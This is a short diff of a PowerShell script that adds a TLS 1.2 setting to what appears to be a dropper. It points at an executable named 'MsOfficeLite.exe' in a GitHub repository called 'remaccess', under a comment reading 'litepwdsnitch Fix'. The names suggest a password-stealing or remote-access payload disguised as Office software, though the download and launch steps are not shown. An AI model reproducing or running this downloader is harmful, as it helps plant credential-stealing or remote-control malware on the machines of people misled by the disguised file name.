@@ -1,3 +1,4 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 #litepwdsnitch Fix
 $url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeLite.exe"
 $Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
